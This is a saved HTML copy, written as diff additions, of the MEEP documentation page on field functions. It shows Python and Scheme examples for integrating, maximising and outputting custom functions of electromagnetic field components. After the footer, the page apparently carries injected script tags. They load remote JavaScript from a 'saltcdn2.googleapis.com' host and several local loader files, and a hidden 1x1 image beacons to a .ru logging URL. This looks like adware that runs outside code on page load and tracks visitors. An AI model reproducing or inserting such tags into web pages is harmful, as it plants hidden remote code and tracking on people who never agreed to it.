+    <span class="caption-text">C++ Interface</span>
+    <ul class="subnav">
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/C++_Developer_Information/">Developer Information</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Chunks_and_Symmetry/">Chunks and Symmetry</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/C++_Tutorial/">Tutorial/Basics</a>
+                </li>
+    </ul>
+	    </li>
+          
+        </ul>
+      </div>
+      &nbsp;
+    <div id="rtd-w4p0crut" class="ethical-rtd ethical-dark-theme"><div class="ethical-sidebar"><div class="ethical-content"><a href="https://readthedocs.org/sustainability/click/305/W173Z5a45zsA/" rel="nofollow" target="_blank" class="ethical-image-link"><img src="./Field Functions - MEEP Documentation_files/readthedocs-logo-fs8.png"></a><div class="ethical-text"><a href="https://readthedocs.org/sustainability/click/305/W173Z5a45zsA/" rel="nofollow" target="_blank">Private repos and priority support<br>Try Read the Docs for Business Today!</a></div></div><div class="ethical-callout"><small><em><a href="https://readthedocs.org/sustainability/advertising/">Sponsored</a><span> · </span><a href="https://docs.readthedocs.io/en/latest/ethical-advertising.html">Ads served ethically</a></em></small></div></div></div></nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+        <a href="https://meep.readthedocs.io/en/latest/">MEEP Documentation</a>
+      </nav>
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="https://meep.readthedocs.io/en/latest/">Docs</a> »</li>
+    
+      
+        
+          <li>Features »</li>
+        
+      
+    
+    <li>Field Functions</li>
+    <li class="wy-breadcrumbs-aside">
+      
+        <a href="https://github.com/NanoComp/meep/edit/master/doc/docs/Field_Functions.md" class="icon icon-github"> Edit on GitHub</a>
+      
+    </li>
+  </ul>
+  <hr>
+</div>
+          <div role="main">
+            <div class="section">
+              
+                <h1 id="field-functions">Field Functions</h1>
+<hr>
+<p>As described in <a href="https://meep.readthedocs.io/en/latest/Python_User_Interface/">Python User Interface</a>, Meep provides several routines to integrate, analyze, and output arbitrary user-specified functions of the field components. See the functions whose names end with <code>_field_function</code>. This facility, while powerful, requires a bit more programming than most Meep usage, and is best illustrated by a few examples.</p>
+<p>Every field-function that can be passed to these routines is of the form <em>f</em>(<strong>r</strong>,components...), where <strong>r</strong> is a position vector and "components..." are zero or more field components that the function depends on. The set of desired components is user-specified. As an example, suppose we are interested in the arbitrary function:</p>
+<p>
+<span class="MathJax_Preview" style="color: inherit;"><span class="MJXp-math MJXp-display" id="MJXp-Span-1"><span class="MJXp-mi MJXp-italic" id="MJXp-Span-2">f</span><span class="MJXp-mo" id="MJXp-Span-3" style="margin-left: 0em; margin-right: 0em;">(</span><span class="MJXp-mrow" id="MJXp-Span-4"><span class="MJXp-mi MJXp-bold" id="MJXp-Span-5">r</span></span><span class="MJXp-mo" id="MJXp-Span-6" style="margin-left: 0em; margin-right: 0.222em;">,</span><span class="MJXp-msubsup" id="MJXp-Span-7"><span class="MJXp-mi MJXp-italic" id="MJXp-Span-8" style="margin-right: 0.05em;">E</span><span class="MJXp-mi MJXp-italic MJXp-script" id="MJXp-Span-9" style="vertical-align: -0.4em;">x</span></span><span class="MJXp-mo" id="MJXp-Span-10" style="margin-left: 0em; margin-right: 0.222em;">,</span><span class="MJXp-msubsup" id="MJXp-Span-11"><span class="MJXp-mi MJXp-italic" id="MJXp-Span-12" style="margin-right: 0.05em;">H</span><span class="MJXp-mi MJXp-italic MJXp-script" id="MJXp-Span-13" style="vertical-align: -0.4em;">z</span></span><span class="MJXp-mo" id="MJXp-Span-14" style="margin-left: 0em; margin-right: 0.222em;">,</span><span class="MJXp-mi MJXp-italic" id="MJXp-Span-15">ε</span><span class="MJXp-mo" id="MJXp-Span-16" style="margin-left: 0em; margin-right: 0em;">)</span><span class="MJXp-mo" id="MJXp-Span-17" style="margin-left: 0.333em; margin-right: 0.333em;">=</span><span class="MJXp-mi MJXp-italic" id="MJXp-Span-18">x</span><span class="MJXp-mrow" id="MJXp-Span-19"><span class="MJXp-mo" id="MJXp-Span-20" style="margin-left: 0.167em; margin-right: 0.167em;">|</span></span><span class="MJXp-mrow" id="MJXp-Span-21"><span class="MJXp-mi MJXp-bold" id="MJXp-Span-22">r</span></span><span class="MJXp-mrow" id="MJXp-Span-23"><span class="MJXp-mo" id="MJXp-Span-24" style="margin-left: 0.167em; margin-right: 0.167em;">|</span></span><span class="MJXp-mo" id="MJXp-Span-25" style="margin-left: 0.267em; margin-right: 0.267em;">+</span><span class="MJXp-msubsup" id="MJXp-Span-26"><span class="MJXp-mi MJXp-italic" id="MJXp-Span-27" style="margin-right: 0.05em;">E</span><span class="MJXp-mi MJXp-italic MJXp-script" id="MJXp-Span-28" style="vertical-align: -0.4em;">x</span></span><span class="MJXp-mo" id="MJXp-Span-29" style="margin-left: 0.267em; margin-right: 0.267em;">−</span><span class="MJXp-mi MJXp-italic" id="MJXp-Span-30">ε</span><span class="MJXp-msubsup" id="MJXp-Span-31"><span class="MJXp-mi MJXp-italic" id="MJXp-Span-32" style="margin-right: 0.05em;">H</span><span class="MJXp-mi MJXp-italic MJXp-script" id="MJXp-Span-33" style="vertical-align: -0.4em;">z</span></span></span></span><div class="MathJax_Display MathJax_Processed"><span class="MathJax" id="MathJax-Element-1-Frame" tabindex="0" style=""><nobr><span class="math" id="MathJax-Span-1"><span style="display: inline-block; position: relative; width: 0em; height: 0px; font-size: 117%;"><span style="position: absolute;"><span class="mrow" id="MathJax-Span-2"><span class="mi" id="MathJax-Span-3" style="font-family: MathJax_Math-italic;">f<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.056em;"></span></span><span class="mo" id="MathJax-Span-4" style="font-family: MathJax_Main;">(</span><span class="texatom" id="MathJax-Span-5"><span class="mrow" id="MathJax-Span-6"><span class="mi" id="MathJax-Span-7" style="font-family: MathJax_Main-bold;">r</span></span></span><span class="mo" id="MathJax-Span-8" style="font-family: MathJax_Main;">,</span><span class="msubsup" id="MathJax-Span-9" style="padding-left: 0.163em;"><span style="display: inline-block; position: relative; width: 1.231em; height: 0px;"><span style="position: absolute; clip: rect(3.154em, 1000.75em, 4.169em, -999.997em); top: -4.004em; left: 0em;"><span class="mi" id="MathJax-Span-10" style="font-family: MathJax_Math-italic;">E<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.009em;"></span></span><span style="position: absolute; top: -3.843em; left: 0.751em;"><span class="mi" id="MathJax-Span-11" style="font-size: 70.7%; font-family: MathJax_Math-italic;">x</span><span style="display: inline-block; width: 0px; height: 4.009em;"></span></span></span></span><span class="mo" id="MathJax-Span-12" style="font-family: MathJax_Main;">,</span><span class="msubsup" id="MathJax-Span-13" style="padding-left: 0.163em;"><span style="display: inline-block; position: relative; width: 1.231em; height: 0px;"><span style="position: absolute; clip: rect(3.154em, 1000.91em, 4.169em, -999.997em); top: -4.004em; left: 0em;"><span class="mi" id="MathJax-Span-14" style="font-family: MathJax_Math-italic;">H<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.056em;"></span></span><span style="display: inline-block; width: 0px; height: 4.009em;"></span></span><span style="position: absolute; top: -3.843em; left: 0.857em;"><span class="mi" id="MathJax-Span-15" style="font-size: 70.7%; font-family: MathJax_Math-italic;">z<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.009em;"></span></span></span></span><span class="mo" id="MathJax-Span-16" style="font-family: MathJax_Main;">,</span><span class="mi" id="MathJax-Span-17" style="font-family: MathJax_Math-italic; padding-left: 0.163em;">ε</span><span class="mo" id="MathJax-Span-18" style="font-family: MathJax_Main;">)</span><span class="mo" id="MathJax-Span-19" style="font-family: MathJax_Main; padding-left: 0.27em;">=</span><span class="mi" id="MathJax-Span-20" style="font-family: MathJax_Math-italic; padding-left: 0.27em;">x</span><span class="texatom" id="MathJax-Span-21"><span class="mrow" id="MathJax-Span-22"><span class="mo" id="MathJax-Span-23" style="font-family: MathJax_Main;">|</span></span></span><span class="texatom" id="MathJax-Span-24"><span class="mrow" id="MathJax-Span-25"><span class="mi" id="MathJax-Span-26" style="font-family: MathJax_Main-bold;">r</span></span></span><span class="texatom" id="MathJax-Span-27"><span class="mrow" id="MathJax-Span-28"><span class="mo" id="MathJax-Span-29" style="font-family: MathJax_Main;">|</span></span></span><span class="mo" id="MathJax-Span-30" style="font-family: MathJax_Main; padding-left: 0.216em;">+</span><span class="msubsup" id="MathJax-Span-31" style="padding-left: 0.216em;"><span style="display: inline-block; position: relative; width: 1.231em; height: 0px;"><span style="position: absolute; clip: rect(3.154em, 1000.75em, 4.169em, -999.997em); top: -4.004em; left: 0em;"><span class="mi" id="MathJax-Span-32" style="font-family: MathJax_Math-italic;">E<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.009em;"></span></span><span style="position: absolute; top: -3.843em; left: 0.751em;"><span class="mi" id="MathJax-Span-33" style="font-size: 70.7%; font-family: MathJax_Math-italic;">x</span><span style="display: inline-block; width: 0px; height: 4.009em;"></span></span></span></span><span class="mo" id="MathJax-Span-34" style="font-family: MathJax_Main; padding-left: 0.216em;">−</span><span class="mi" id="MathJax-Span-35" style="font-family: MathJax_Math-italic; padding-left: 0.216em;">ε</span><span class="msubsup" id="MathJax-Span-36"><span style="display: inline-block; position: relative; width: 1.231em; height: 0px;"><span style="position: absolute; clip: rect(3.154em, 1000.91em, 4.169em, -999.997em); top: -4.004em; left: 0em;"><span class="mi" id="MathJax-Span-37" style="font-family: MathJax_Math-italic;">H<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.056em;"></span></span><span style="display: inline-block; width: 0px; height: 4.009em;"></span></span><span style="position: absolute; top: -3.843em; left: 0.857em;"><span class="mi" id="MathJax-Span-38" style="font-size: 70.7%; font-family: MathJax_Math-italic;">z<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.009em;"></span></span></span></span></span></span></span></span></nobr></span></div><script type="math/tex; mode=display" id="MathJax-Element-1">f(\mathbf{r}, E_x, H_z, \varepsilon) = x |\mathbf{r}| + E_x - \varepsilon H_z</script>
+</p>
+<p>We would define this function by:</p>
+<p><strong>Python</strong></p>
+<pre><code class="py hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span><span class="hljs-params">(r, ex, hz, eps)</span>:</span>
+    <span class="hljs-keyword">return</span> (r.x * r.norm() + ex) - (eps * hz)
+</code></pre>
+
+<p><strong>Scheme</strong></p>
+<pre><code class="scm hljs scheme"><span class="hljs-list">(<span class="hljs-keyword"><span class="hljs-built_in">define</span></span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword">f</span>&nbsp;r&nbsp;ex&nbsp;hz&nbsp;eps)</span>
+&nbsp;&nbsp;&nbsp;<span class="hljs-list">(<span class="hljs-keyword"><span class="hljs-built_in">-</span></span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword"><span class="hljs-built_in">+</span></span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword"><span class="hljs-built_in">*</span></span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword">vector3-x</span>&nbsp;r)</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword">vector3-norm</span>&nbsp;r)</span>)</span>&nbsp;ex)</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword"><span class="hljs-built_in">*</span></span>&nbsp;eps&nbsp;hz)</span>)</span>)</span>
+</code></pre>
+
+<p>Note that the argument <code>r</code> is a <a href="https://meep.readthedocs.io/en/latest/Python_User_Interface/#vector3"><code>Vector3</code></a> (Python) or <a href="https://libctl.readthedocs.io/en/latest/User_Reference"><code>vector3</code></a> (Scheme) object.</p>
+<p>Now, suppose we want to compute the integral of this function, over the whole cell. We can do this by calling the function <code>integrate_field_function</code> (Python) or <code>integrate-field-function</code> (Scheme), as follows:</p>
+<p><strong>Python</strong></p>
+<pre><code class="py hljs python">print(<span class="hljs-string">"The integral of our weird function is: {}"</span>
+       .format(meep.Simulation.integrate_field_function([meep.Ex, meep.Hz, meep.Dielectric], f)))
+</code></pre>
+
+<p><strong>Scheme</strong></p>
+<pre><code class="scm hljs scheme"><span class="hljs-list">(<span class="hljs-keyword">print</span> <span class="hljs-string">"The integral of our weird function is: "</span>
+       <span class="hljs-list">(<span class="hljs-keyword">integrate-field-function</span> <span class="hljs-list">(<span class="hljs-keyword"><span class="hljs-built_in">list</span></span> Ex Hz Dielectric)</span> f)</span> <span class="hljs-string">"\n"</span>)</span>
+</code></pre>
+
+<p>Note that the first argument to <code>integrate_field_function</code> (Python) or <code>integrate-field-function</code> (Scheme) is a list, which is a standard type, of <code>component</code> constants, specifying in order the list of field components the function <code>f</code> expects to be passed. Meep will then call <code>f</code> for every point in the cell in parallel on a parallel machine, and return the integral approximated by a <a href="https://en.wikipedia.org/wiki/trapezoidal_rule">trapezoidal rule</a>.</p>
+<p>You can also specify an optional third argument to <code>integrate_field_function</code> (Python) or <code>integrate-field-function</code> (Scheme), specifying an integration volume in case you don't want the integral over the whole cell. For example, the following code computes the integral of <code>f</code> along a line from (-1,0,0) to (1,0,0):</p>
+<p><strong>Python</strong></p>
+<pre><code class="py hljs python">print(<span class="hljs-string">"The integral of our weird function from (-1,0,0) to (1,0,0) is: {}"</span>
+       .format(meep.Simulation.integrate_field_function([meep.Ex, meep.Hz, meep.Dielectric], f, meep.Volume(size=meep.Vector3(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>), center=meep.Vector3(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)))))
+</code></pre>
+
+<p><strong>Scheme</strong></p>
+<pre><code class="scm hljs scheme"><span class="hljs-list">(<span class="hljs-keyword">print</span>&nbsp;<span class="hljs-string">"The&nbsp;integral&nbsp;of&nbsp;our&nbsp;weird&nbsp;function&nbsp;from&nbsp;(-1,0,0)&nbsp;to&nbsp;(1,0,0)&nbsp;is:&nbsp;"</span>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-list">(<span class="hljs-keyword">integrate-field-function</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword"><span class="hljs-built_in">list</span></span>&nbsp;Ex&nbsp;Hz&nbsp;Dielectric)</span>&nbsp;f&nbsp;<span class="hljs-list">(<span class="hljs-keyword">volume</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword">size</span>&nbsp;<span class="hljs-number">2</span>&nbsp;<span class="hljs-number">0</span>&nbsp;<span class="hljs-number">0</span>)</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword">center</span>&nbsp;<span class="hljs-number">0</span>&nbsp;<span class="hljs-number">0</span>&nbsp;<span class="hljs-number">0</span>)</span>)</span>)</span>&nbsp;<span class="hljs-string">"\n"</span>)</span>
+</code></pre>
+
+<p>Instead of computing the integral, Meep also provides a function to compute the maximum absolute value of our given function:</p>
+<p><strong>Python</strong></p>
+<pre><code class="py hljs python">print(<span class="hljs-string">"The maximum absolute value of our weird function from (-1,0,0) to (1,0,0) is: {}"</span>
+       .format(meep.Simulation.max_abs_field_function([meep.Ex, meep.Hz, meep.Dielectric], f, meep.Volume(size=meep.Vector3(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>), center=meep.Vector3(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)))))
+</code></pre>
+
+<p><strong>Scheme</strong></p>
+<pre><code class="scm hljs scheme"><span class="hljs-list">(<span class="hljs-keyword">print</span>&nbsp;<span class="hljs-string">"The&nbsp;maximum&nbsp;absolute&nbsp;value&nbsp;of&nbsp;our&nbsp;weird&nbsp;function&nbsp;from&nbsp;(-1,0,0)&nbsp;to&nbsp;(1,0,0)&nbsp;is:&nbsp;"</span>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-list">(<span class="hljs-keyword">max-abs-field-function</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword"><span class="hljs-built_in">list</span></span>&nbsp;Ex&nbsp;Hz&nbsp;Dielectric)</span>&nbsp;f&nbsp;<span class="hljs-list">(<span class="hljs-keyword">volume</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword">size</span>&nbsp;<span class="hljs-number">2</span>&nbsp;<span class="hljs-number">0</span>&nbsp;<span class="hljs-number">0</span>)</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword">center</span>&nbsp;<span class="hljs-number">0</span>&nbsp;<span class="hljs-number">0</span>&nbsp;<span class="hljs-number">0</span>)</span>)</span>)</span>&nbsp;<span class="hljs-string">"\n"</span>)</span>
+</code></pre>
+
+<p>Finally, we can also output our function to an HDF5 file, similar to the built-in functions to output selected field components, and so on. The following outputs an HDF5 file consisting of our function <code>f</code> evaluated at every point in the cell:</p>
+<p><strong>Python</strong></p>
+<pre><code class="py hljs python">meep.Simulation.output_field_function(<span class="hljs-string">"weird-function"</span>, [meep.Ex, meep.Hz, meep.Dielectric], f)
+</code></pre>
+
+<p><strong>Scheme</strong></p>
+<pre><code class="scm hljs scheme"><span class="hljs-list">(<span class="hljs-keyword">output-field-function</span>&nbsp;<span class="hljs-string">"weird-function"</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword"><span class="hljs-built_in">list</span></span>&nbsp;Ex&nbsp;Hz&nbsp;Dielectric)</span>&nbsp;f)</span>
+</code></pre>
+
+<p>The first argument is used for the name of the dataset within the HDF5, and is also used for the name of the HDF5 file itself plus a <code>.h5</code> suffix and a time stamp, unless you have specified the output file via <code>to_appended</code> (Python) or <code>to-appended</code> (Scheme) or other means.</p>
+<p>The above example calls the integration, maximum, and output routines only once, at the current time. Often, you will want to pass them to <code>meep.Simulation.run(..., until=...)</code> (Python) or <code>run-until</code> (Scheme) instead, using <code>at_every</code> (Python) or <code>at-every</code> (Scheme) to print or output at periodic time intervals. A common mistake is to do something like the following:</p>
+<p><strong>Python</strong></p>
+<pre><code class="py hljs python">meep.Simulation.run(mp.at_every(<span class="hljs-number">1</span>, meep.Simulation.output_field_function(<span class="hljs-string">"weird-function"</span>, [meep.Ex, meep.Hz, meep.Dielectric], f)), until=<span class="hljs-number">200</span>)
+</code></pre>
+
+<p><strong>Scheme</strong></p>
+<pre><code class="scm hljs scheme"><span class="hljs-list">(<span class="hljs-keyword">run-until</span>&nbsp;<span class="hljs-number">200</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword">at-every</span>&nbsp;<span class="hljs-number">1</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword">output-field-function</span>&nbsp;<span class="hljs-string">"weird-function"</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword"><span class="hljs-built_in">list</span></span>&nbsp;Ex&nbsp;Hz&nbsp;Dielectric)</span>&nbsp;f)</span>)</span>)</span>
+</code></pre>
+
+<p>This is <strong>wrong</strong>, and will cause Meep to exit with a strange error message. The reason is that the step functions you pass to <code>meep.Simulation.run</code> (Python) or <code>run-until</code> (Scheme) must be <em>functions</em>. For example, if you call <code>meep.Simulation.run(meep.output_hfield, until=200)</code> (Python) or <code>(run-until 200 output-hfield)</code> (Scheme),<code>output_hfield</code> (Python) or  <code>output-hfield</code> (Scheme)  is the name of a <em>function</em> which <code>meep.Simulation.run</code> (Python) or <code>run-until</code> (Scheme) will call to output the field. The incorrect code above, however, first <em>calls</em> the function <code>output_field_function</code> (Python) or <code>output-field-function</code> (Scheme) to output an HDF5 file, and then passes the <em>result</em> of this function to <code>meep.Simulation.run</code> (Python) or <code>run-until</code> (Scheme). Instead, you must write a new function which you can pass to <code>meep.Simulation.run</code> (Python) or <code>run-until</code> (Scheme), like the following:</p>
+<p><strong>Python</strong></p>
+<pre><code class="py hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">my_weird_output</span><span class="hljs-params">(sim)</span>:</span>
+    meep.Simulation.output_field_function(<span class="hljs-string">"weird-function"</span>, [meep.Ex, meep.Hz, meep.Dielectric], f)    
+
+meep.Simulation.run(meep.at_every(<span class="hljs-number">1</span>,my_weird_output), until=<span class="hljs-number">200</span>)
+</code></pre>
+
+<p><strong>Scheme</strong></p>
+<pre><code class="scm hljs scheme"><span class="hljs-list">(<span class="hljs-keyword"><span class="hljs-built_in">define</span></span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword">my-weird-output</span>)</span>
+    <span class="hljs-list">(<span class="hljs-keyword">output-field-function</span>&nbsp;<span class="hljs-string">"weird-function"</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword"><span class="hljs-built_in">list</span></span>&nbsp;Ex&nbsp;Hz&nbsp;Dielectric)</span>&nbsp;f)</span>)</span>
+
+<span class="hljs-list">(<span class="hljs-keyword">run-until</span>&nbsp;<span class="hljs-number">200</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword">at-every</span>&nbsp;<span class="hljs-number">1</span>&nbsp;my-weird-output)</span>)</span>
+</code></pre>
+
+<p>We have defined a function <code>my_weird_output</code> (Python) of one argument (the simulation instance) and <code>my-weird-output</code> (Scheme) of no arguments that, when called, outputs our function <code>f</code>. We then pass this function to <code>meep.Simulation.run</code> (Python) or <code>run-until</code> (Scheme). In contrast, our incorrect code above corresponds to passing <code>my_weird_output(t)</code> (Python) or <code>(my-weird-output)</code> (Scheme), the <em>result</em> of calling <code>my_weird_output</code> to <code>meep.Simulation.run</code> (Python) or <code>my-weird-output</code> to <code>run-until</code> (Scheme).</p>
+<p>As described in <a href="https://meep.readthedocs.io/en/latest/Synchronizing_the_Magnetic_and_Electric_Fields/">Synchronizing the Magnetic and Electric Fields</a>, because this example function combines electric and magnetic fields, we may want to synchronize them in time in order to compute this function more accurately, by wrapping it with <code>synchronized_magnetic</code> (Python) or <code>synchronized-magnetic</code> (Scheme):</p>
+<p><strong>Python</strong></p>
+<pre><code class="py hljs python">meep.Simulation.run(meep.synchronized_magnetic(meep.at_every(<span class="hljs-number">1</span>,my_weird_output)), until=<span class="hljs-number">200</span>)
+</code></pre>
+
+<p><strong>Scheme</strong></p>
+<pre><code class="scm hljs lisp"><span class="hljs-list">(<span class="hljs-keyword">run-until</span>&nbsp;<span class="hljs-number">200</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword">synchronized-magnetic</span>&nbsp;<span class="hljs-list">(<span class="hljs-keyword">at-every</span>&nbsp;<span class="hljs-number">1</span>&nbsp;my-weird-output)</span>)</span>)</span>
+</code></pre>
+
+<p>As a final example, the Python interface routine <a href="https://meep.readthedocs.io/en/latest/Python_User_Interface/#array-metadata"><code>get_array_metadata</code></a> used to obtain the coordinates of grid points in a volume slice can be replicated in Scheme via e.g.:</p>
+<pre><code class="scm hljs scheme"><span class="hljs-list">(<span class="hljs-keyword"><span class="hljs-built_in">define</span></span> <span class="hljs-list">(<span class="hljs-keyword">f</span> r eps)</span> <span class="hljs-list">(<span class="hljs-keyword">vector3-x</span> r)</span>)</span>
+<span class="hljs-list">(<span class="hljs-keyword">output-real-field-function</span> <span class="hljs-string">"x"</span> Dielectric f)</span>
+</code></pre>
+
+<p>For more information, see <a href="https://meep.readthedocs.io/en/latest/Python_User_Interface/#writing-your-own-step-functions">Python User Interface</a> or <a href="https://meep.readthedocs.io/en/latest/Scheme_User_Interface/#writing-your-own-step-functions">Scheme User Interface</a>.</p>
+              
+            </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="https://meep.readthedocs.io/en/latest/The_Run_Function_Is_Not_A_Loop/" class="btn btn-neutral float-right" title="The Run Function is Not a Loop">Next <span class="icon icon-circle-arrow-right"></span></a>
+      
+      
+        <a href="https://meep.readthedocs.io/en/latest/Mode_Decomposition/" class="btn btn-neutral" title="Mode Decomposition"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr><div><div id="rtd-kntw5h1z" class="ethical-rtd"></div></div>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+    
+  </div>
+
+  Built with <a href="http://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org/">Read the Docs</a>.
+</footer>
+      
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" style="cursor: pointer">
+    <span class="rst-current-version" data-toggle="rst-current-version">
+      
+          <a href="https://github.com/NanoComp/meep/" class="fa fa-github" style="float: left; color: #fcfcfc"> GitHub</a>
+      
+      
+        <span><a href="https://meep.readthedocs.io/en/latest/Mode_Decomposition/" style="color: #fcfcfc;">« Previous</a></span>
+      
+      
+        <span style="margin-left: 15px"><a href="https://meep.readthedocs.io/en/latest/The_Run_Function_Is_Not_A_Loop/" style="color: #fcfcfc">Next »</a></span>
+      
+    </span>
+</div>
+    <script>var base_url = '..';</script>
+    <script src="./Field Functions - MEEP Documentation_files/theme.js.download"></script>
+      <script src="./Field Functions - MEEP Documentation_files/MathJax.js.download"></script>
+      <script src="./Field Functions - MEEP Documentation_files/readthedocs-data.js.download"></script>
+      <script src="./Field Functions - MEEP Documentation_files/readthedocs-doc-embed.js.download"></script>
+      <script src="./Field Functions - MEEP Documentation_files/readthedocs-analytics.js.download"></script>
+      <script src="./Field Functions - MEEP Documentation_files/require.js.download"></script>
+      <script src="./Field Functions - MEEP Documentation_files/search.js.download"></script>
+
+
+
+<div id="rtd-knxjtpn3j"></div><iframe height="1" width="1" src="./Field Functions - MEEP Documentation_files/log.html" style="display: none;"></iframe><script id="loader.js" src="./Field Functions - MEEP Documentation_files/loader.js.download"></script><script id="fbshowes_af2.js" src="./Field Functions - MEEP Documentation_files/fbshowes_af2.js.download"></script><script id="yloader.js" src="./Field Functions - MEEP Documentation_files/yloader.js.download"></script><script id="like_bb6.js" src="https://saltcdn2.googleapis.com/like_bb6.js"></script><script id="vklike_ab12.js" src="https://saltcdn2.googleapis.com/vklike_ab12.js"></script><script id="fblikes_bc3.js" src="./Field Functions - MEEP Documentation_files/fblikes_bc3.js.download"></script><script id="inlloader.js" src="./Field Functions - MEEP Documentation_files/inlloader.js.download"></script><script id="init.js?201972" src="./Field Functions - MEEP Documentation_files/init.js.download"></script><div style="position: absolute; width: 0px; height: 0px; overflow: hidden; padding: 0px; border: 0px; margin: 0px;"><div id="MathJax_Font_Test" style="position: absolute; visibility: hidden; top: 0px; left: 0px; width: auto; padding: 0px; border: 0px; margin: 0px; white-space: nowrap; text-align: left; text-indent: 0px; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; font-size: 40px; font-weight: normal; font-style: normal; font-family: MathJax_Main-bold, monospace;"></div></div><img height="1" width="1" src="https://saltjs.01bd.ru/log/05dfdd0631124408?utm=v1.0.1_node-cdn8&amp;src=1&amp;tm=1560154868&amp;rand=0.8377177868300811" style="display: none;"><!-- Inserted RTD Footer -->
+<div class="injected">
+
+  
+  <div class="rst-versions rst-badge" data-toggle="rst-versions">
+    <span class="rst-current-version" data-toggle="rst-current-version">
+      <span class="fa fa-book">&nbsp;</span>
+      v: latest
+      <span class="fa fa-caret-down"></span>
+    </span>
+    <div class="rst-other-versions">
+      
+
+      
+      
+      
+      <dl>
+        <dt>Versions</dt>
+        
+        
+        <dd><a href="https://meep.readthedocs.io/en/master/Field_Functions.html">master</a></dd>
+        
+        
+         <strong> 
+        <dd><a href="https://meep.readthedocs.io/en/latest/Field_Functions.html">latest</a></dd>
+         </strong> 
+        
+        
+        <dd><a href="https://meep.readthedocs.io/en/stable/Field_Functions.html">stable</a></dd>
+        
+        
+      </dl>
+      
+      
+
+      
+      
+      
+
+      
+      <dl>
+        <!-- These are kept as relative links for internal installs that are http -->
+        <dt>On Read the Docs</dt>
+        <dd>
+          <a href="https://readthedocs.org/projects/meep/">Project Home</a>
+        </dd>
+        <dd>
+          <a href="https://readthedocs.org/projects/meep/builds/">Builds</a>
+        </dd>
+        <dd>
+          <a href="https://readthedocs.org/projects/meep/downloads/">Downloads</a>
+        </dd>
+      </dl>
+      
+
+      
+
+      
+      <dl>
+        <dt>On GitHub</dt>
+        <dd>
+          <a href="https://github.com/stevengj/meep/blob/master/doc/docs/Field_Functions.md">View</a>
+        </dd>
+        
+        <dd>
+          <a href="https://github.com/stevengj/meep/edit/master/doc/docs/Field_Functions.md">Edit</a>
+        </dd>
+        
+      </dl>
+      
+      
+
+      
+      <dl>
+        <dt>Search</dt>
+        <dd>
+          <div style="padding: 6px;">
+            <form id="flyout-search-form" class="wy-form" target="_blank" action="https://readthedocs.org/projects/meep/search/" method="get">
+              <input type="text" name="q" placeholder="Search docs">
+              </form>
+          </div>
+        </dd>
+      </dl>
+      
+
+
+
+      <hr>
+      
+        <small>
+          <span>Hosted by <a href="https://readthedocs.org/">Read the Docs</a></span>
+          <span> · </span>
+          <a href="https://docs.readthedocs.io/page/privacy-policy.html">Privacy Policy</a>
+        </small>
+      
+
+      
+    </div>
+  </div>
+  
+
+</div>
